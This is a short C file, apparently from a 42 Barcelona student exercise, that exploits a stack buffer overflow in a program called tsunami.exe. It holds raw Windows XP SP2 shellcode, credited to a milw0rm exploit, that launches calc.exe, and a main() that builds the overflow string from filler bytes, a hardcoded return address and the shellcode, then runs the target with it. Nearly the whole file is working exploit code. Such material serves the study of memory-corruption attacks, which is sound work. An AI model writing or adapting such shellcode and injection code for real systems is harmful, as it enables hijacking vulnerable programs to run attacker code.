/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: msoler-e <msoler-e@student.42barcel>       +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/08/18 10:57:01 by msoler-e          #+#    #+#             */
/*   Updated: 2022/08/18 13:20:21 by msoler-e         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */
/*
win32/xp sp2 calc.exe 45 bytes
Author : Mountassif Moad
Big Thnx : To my brother iuoisn & His0ka & Jadi ...... Mr.Safa7
Changed by : Stack
First shellcode : http://www.milw0rm.com/exploits/7971
Description : It is 45 Bytes Shellcode which Execute calc.exe Tested Under Windows Xp SP2
for exploited a stack overflow have a small space to put our shellcode xd :d  just for fun :d
//llocm memoria winexec = 0x000623AD
*/
#include <stdio.h>
#include <string.h>
unsigned char shellcode[] ="\xeb\x0e\xba\xad\x23\x86\x7c\xff\xd2\xba\xfa\xca\x81\x7c\xff\xd2\xe8\xed\xff\xff\xff\x63\x61\x6c\x63\x00";

int main (int argc, char **argv)
{
	char shellstorm[256];

	strcpy(shellstorm,"AAAABBBB");
	strcat(shellstorm, "\x7B\x46\x86\x7C");
	strcat(shellstorm,shellcode);
	argv[0]="tsunami";
	argv[1]=shellstorm;
	argv[2]=NULL;
	execv("tsunami.exe",argv);
	return(0);
		
}
